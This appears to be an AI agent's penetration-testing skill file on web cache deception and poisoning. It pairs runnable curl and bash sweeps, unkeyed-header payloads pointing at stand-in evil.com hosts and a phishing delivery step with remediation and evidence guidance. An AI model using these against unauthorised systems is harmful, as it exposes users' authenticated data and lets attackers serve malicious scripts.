---
name: web-cache-deception
description: >-
  Web cache deception and poisoning playbook. Use when CDN, reverse proxy, or application caching may serve sensitive authenticated content to other users due to path confusion or cache key manipulation.
---

# SKILL: Web Cache Deception — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Web cache deception and poisoning techniques. Covers path confusion attacks, CDN cache behavior exploitation, cache key manipulation, and the distinction between cache deception (steal data) and cache poisoning (serve malicious content). Presented by Omer Gil at Black Hat 2017 and significantly expanded since.

### Advanced Reference

Also load [CACHE_POISONING_TECHNIQUES.md](./CACHE_POISONING_TECHNIQUES.md) when you need:
- Web Cache Poisoning vs Web Cache Deception — clear distinction and attack flow comparison
- Unkeyed header poisoning (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, multiple Host headers)
- Unkeyed parameter poisoning (utm_content, fbclid, callback, reflected but not in cache key)
- Fat GET cache poisoning (body parameters reflected but not keyed)
- Parameter cloaking via semicolons and duplicate parameter parsing differentials
- CDN-specific behavior: Cloudflare, CloudFront, Akamai, Varnish, Fastly (cache key composition, debug headers, ESI)
- Vary header manipulation, cache partitioning attacks, and missing Vary vulnerabilities

## 0. RELATED ROUTING

Load these alongside this skill - cache deception is a *storage* bug, and the payload that makes it
dangerous usually comes from elsewhere:

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) - boundary-splitting payloads a poisoned cache can serve
- [request-smuggling](../request-smuggling/SKILL.md) - desync that can write a response into the cache for another user
- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the compact poisoning playbook companion to this long-form file
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - what turns a poisoned cached page into execution
- [burp-scan](../burp-scan/SKILL.md) - confirming a cache finding outside the scanner

---

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
# Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

# Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
# Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

# Check response headers:
# X-Cache: MISS (first request)
# Age: 0

# Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

# Check response:
# X-Cache: HIT
# Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
# Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text
# Application treats these as equivalent:
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

# CDN treats .css as cacheable static asset
→ Mismatch = vulnerability
```

---

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
# Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
# or:
<link rel="canonical" href="https://evil.com/">

# If response is cached → all users see evil.com references
# Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
# Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

# Encoded separators:
/account/profile%2F.css

# Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---

## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---

## 7. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```

---

## 8. EXECUTION PRIMITIVES

Cache deception is proven with **cache-behaviour measurements**, not with a single interesting
response. These blocks establish the cache key, the cacheability of the confused path, and whether
authenticated data was actually stored.

### 8.1 Is it cached at all, and for how long?

```bash
U="https://target.tld/account/profile"
for i in 1 2 3; do
  curl -sS -D- -o /dev/null "$U" \
    | grep -iE '^(x-cache|cf-cache-status|age|x-served-by|x-cache-hits|akamai-cache-status|cache-control)' \
    | sed "s/^/run$i: /"
  sleep 1
done
```

`x-cache: Miss` then `Hit`, with a rising `Age`, is cacheability. **A header only some CDNs emit** -
if none appear, the cache is transparent or absent and this file does not apply. CloudFront emits
`X-Cache`, Cloudflare `CF-Cache-Status`, Fastly `X-Served-By`/`X-Cache`, Akamai
`X-Cache`/`Akamai-Cache-Status`; verify with the actual origin, not by assumption.

### 8.2 Extension confusion sweep

```bash
BASE="https://target.tld/account/profile"
for EXT in .css .js .jpg .png .gif .svg .ico .woff .woff2 .ttf .eot .pdf .json .xml .txt .csv            .avif .webp .map .min.css .php .html .htmlx .json .shtml .rss .atom .swf .wasm ; do
  C=$(curl -sS -o /tmp/b -w '%{http_code}' "$BASE/nonexistent$EXT")
  SZ=$(wc -c </tmp/b)
  echo "$EXT http=$C bytes=$SZ  $(grep -oiE 'x-cache[^\r]*' /tmp/h 2>/dev/null)"
done 2>/dev/null
```

Then **repeat for each candidate, examining headers**, because the interesting row is the one that
returns the profile body *and* a cache `Hit`:

```bash
for EXT in .css .js .jpg .avif .map .min.css; do
  curl -sS -D/tmp/h -o /tmp/b  "https://target.tld/account/profile/x$EXT"
  printf '%-10s %s %s bytes=%s\n' "$EXT" \
    "$(grep -icE 'cache|age' /tmp/h)" "$(grep -oE 'HTTP/[0-9.]+ [0-9]+' /tmp/h | head -1)" "$(wc -c </tmp/b)"
  grep -icE 'username|email|csrf|account' /tmp/b | sed 's/^/  sensitive_hits=/'
done
```

A row where the body contains account data **and** the response is cacheable is the confusion. A row
that caches but serves a generic 404 page is not.

### 8.3 Path-normalisation differential matrix

```bash
# which delimiters make the ORIGIN ignore the suffix, and which make the CACHE treat it as static?
SUFFIXES=( '/x.css' ';x.css' '%2fx.css' '%3bx.css' '?a.css' '#x.css' '/..%2fx.css' '/%00x.css' )
for S in "${SUFFIXES[@]}"; do
  O=$(curl -sS -o /tmp/o -w '%{http_code}' "https://target.tld/account/profile${S}")
  H=$(curl -sS -D/tmp/ho -o /tmp/h -w '%{http_code}' "https://target.tld/account/profile${S}")
  CACHE=$(grep -icE 'x-cache|cf-cache' /tmp/ho)
  SAME=$([ "$(md5sum </tmp/o)" = "$(md5sum </tmp/h)" ] && echo same || echo DIFFER)
  printf '%-16s origin=%s cache=%s body=%s sensitive=%s\n' "$S" "$O" "$CACHE" "$SAME" \
    "$(grep -icE 'username|email|csrf' /tmp/h)"
done
```

The **differential is the attack**: a suffix the origin strips (serving the profile) but the cache
keys on as a static file is exactly the deception primitive. Record the pair, not just the hit.

### 8.4 Unkeyed-header poisoning candidate sweep

```bash
KEYED="Host"
for H in 'X-Forwarded-Host: evil.tld' 'X-Forwarded-Scheme: http' 'X-Original-URL: /admin' \
         'X-Rewrite-URL: /admin' 'X-Host: evil.tld' 'Forwarded: host=evil.tld' \
         'X-Forwarded-Server: evil.tld' 'X-HTTP-Method-Override: POST' \
         'X-Forwarded-Port: 1337' 'X-Forwarded-Prefix: /evil'; do
  # 1. send it, 2. re-fetch CLEAN and see whether the clean response changed
  curl -sS -o /dev/null "https://target.tld/page?cb=$RANDOM" -H "$H"
  R=$(curl -sS "https://target.tld/page?cb=$RANDOM")
  echo "$R" | grep -qi 'evil.tld\|/admin\|1337\|http://' && echo "REFLECTED+STORED: $H"
done
```

The second request **without the header** is the whole test. If the clean request now contains your
value, the header is unkeyed and stored - that is cache poisoning. If it does not, the header is
either keyed or not reflected.

### 8.5 Prove the deception end to end with two identities

```bash
# VICTIM: a browser session you own, logged in
#   visit https://target.tld/account/profile/nonexistent.css, then close the tab
# ATTACKER: a clean session, no cookies
curl -sS -D- -o /tmp/atk "https://target.tld/account/profile/nonexistent.css"
grep -iE 'x-cache|cf-cache-status|age' /tmp/atk
grep -icE 'victim@example\.com|username|csrf' /tmp/atk | sed 's/^/victim_data_in_attacker_response=/'
```

`victim_data_in_attacker_response` greater than zero, with a cache `Hit`, is the finding. A `Hit`
with only public content is not.

### 8.6 Cache-key computation checks

```bash
# does the cache key include the query string, the body, the cookie, or the extension?
for Q in "?a=1" "?a=2" "?a=1&b=2"; do
  curl -sS -o /dev/null "https://target.tld/page$Q"
  curl -sS -D- -o /dev/null "https://target.tld/page$Q" | grep -iE 'x-cache|age' | sed "s/^/$Q /"
done
# fat GET: body reflected but not keyed
curl -sS -o /dev/null "https://target.tld/page" -X GET --data 'utm_content=INJECTED'
curl -sS "https://target.tld/page" | grep -c 'INJECTED'
```

If the fat-GET second request shows `INJECTED` with a clean URL, the body participates in the
response but not in the key - a stored injection into everyone's cache.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is there a **cache in front of the origin** at all, shown by a cache header or hit/miss behaviour? | without a cache, this bug class does not exist |
| 2 | Does the confused path return **authenticated data** to an unauthenticated request? | the deception, not merely a cacheable page |
| 3 | Is the response served from cache with an **`Age`/`Hit`** for a *different* client? | proves the data was stored and shared, not generated per request |
| 4 | Is the suffix the cache keys on (**extension or delimiter**) and the origin ignores **the same string**? | the differential is the primitive; both halves must be shown |
| 5 | For poisoning: does a **clean request without your header** return your injected value? | unkeyed-and-stored; otherwise it is reflection |
| 6 | Does the payload **execute or expose** something for a victim (script loaded, data leaked)? | impact beyond storage |
| 7 | Is the behaviour reproducible from a **fresh browser session with no special state**? | rules out a session-specific artefact |

**Two conditions, always.** Deception needs *origin strips the suffix* **and** *cache keys on the
suffix*. Report both halves with the requests that show them; one half alone is a misdiagnosis, and
"the response was cached" is not a vulnerability.

---

## 10. EVIDENCE STANDARD

| Item | Why |
|---|---|
| Both requests: the **victim's authenticated request** and the **attacker's clean request** | the pair is the finding; either alone is uninterpretable |
| The sensitive content **present in the attacker's response**, with the field named | proves data exposure, not a cached shell |
| The **cache headers** (`X-Cache`/`CF-Cache-Status`/`Age`/`X-Served-By`) on both requests | proves storage and sharing |
| The **origin's response to the same URL without the suffix** | proves the origin ignores the suffix (the first half of the differential) |
| For poisoning: the request **with** the unkeyed header and the clean request **without** it | proves the header is unkeyed and the value is stored |
| For poisoning: the **payload and its effect** in a browser with the victim's session | proves execution or exposure, not storage |
| The **cache vendor and TTL observed** (through `Age` progression) | determines the window of exposure and the fix owner |
| The **cache key you inferred** and the test that established it | drives the remediation (which component must normalise) |
| Confirmation that the two identities are **both yours**, with the victim's ownership stated | no third party was exposed; the report must state the blast radius |
| The **timestamp and URL** with any cache-buster you added, noted explicitly | a `?cb=` you added yourself changes the key and can invalidate the observation |

Report the **differential and the exposed field**: "`/account/profile/x.css` is served by the origin
as the profile page (identical bytes to `/account/profile`) and cached by CloudFront
(`X-Cache: Hit`, `Age: 41`); a clean unauthenticated request for the same URL returns the captured
profile including `victim@example.com`, so the suffix is stripped by the origin but keyed by the
cache", never "the site is vulnerable to cache deception".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Response is cached but contains only public content | no boundary crossed |
| The page differs between sessions because of a query parameter you added | you changed the cache key yourself |
| `Age` progresses but the body is a generic 404/error page | the cache stored an error, not data |
| Origin returns the profile for the suffix, but the response has `Cache-Control: private, no-store` | the origin forbade caching; the CDN is honouring it |
| The "victim" content appears because you were still logged in on that request | the request was authenticated by you |
| Cache hit on a path that is **already public** | expected behaviour |
| Reflection of your header in the same response only | reflection, not unkeyed storage |
| A CDN debug header showing `Hit` for a shared asset (`/style.css`) | that is what the CDN is for |
| A `Vary` header present and honoured | the cache is correctly partitioned |
| Cache hit observed only with a cache-buster you added | you invalidated the sharing condition |
| Different bytes returned after the TTL expired | normal revalidation, not a deception |
| The test leaked a third party's data | that is an incident; stop and report it as such |

**Never leave a victim's data in a shared cache.** Once you confirm storage, request the poisoned URL
with a cache-buster or purge it if you can, note the exposure window, and say so in the report.

---

## 11. REMEDIATION REFERENCE

1. **Do not let the origin ignore path suffixes it did not route on** - if the application will serve `/account/profile` for `/account/profile/x.css`, it must either reject the request or redirect to the canonical path. Silent suffix tolerance is the root cause.
2. **Send `Cache-Control: private, no-store` on every authenticated response** - this is the single most effective control. Mark anything derived from a session, cookie, or authorization decision as uncacheable, explicitly and by default.
3. **Configure the CDN to key on the full path and to respect origin cache directives** - never let the CDN override `no-store` or `private`, and never derive cacheability from the file extension alone.
4. **Normalise before caching, not after** - perform path normalisation, decoding, and delimiter handling at the edge consistently with the origin, so both components agree on what the resource is.
5. **Do not cache responses to requests that carry a session or `Authorization` header** - a blanket edge rule is more robust than per-route configuration that new endpoints may miss.
6. **Avoid extension-based cacheability heuristics entirely** - a path ending in `.css` is not evidence of static content; use an explicit allowlist of static prefixes plus an explicit content-type check.
7. **Validate and key on all request components that influence the response** - if a header, cookie, or body value changes the output, it must be in the key or the response must be uncacheable. This closes unkeyed-header and fat-GET poisoning together.
8. **Reject or strip hop-by-hop and routing-override headers at the edge** - `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, and friends should be set by the edge, not accepted from clients.
9. **Purge on deploy and provide a purge path** - a poisoned entry outlives the fix; deploy should invalidate, and operators need a documented way to purge a specific key during an incident.
10. **Set conservative TTLs on anything user-adjacent** - shorter TTLs reduce the exposure window while the routing bugs are fixed; treat session-adjacent paths as uncacheable regardless.
11. **Test cache behaviour in CI** - assert that an authenticated request returns `no-store`, that a suffixed path is rejected or redirected, and that an unkeyed header does not change a cached response. Cache regressions are deployment regressions and are invisible in unit tests.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the compact poisoning companion playbook
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) - boundary-splitting payloads a poisoned cache can serve
- [request-smuggling](../request-smuggling/SKILL.md) - the desync that can write a response into another user's cache slot
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - execution once a cached page carries attacker content
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the sibling normalisation-differential bug class
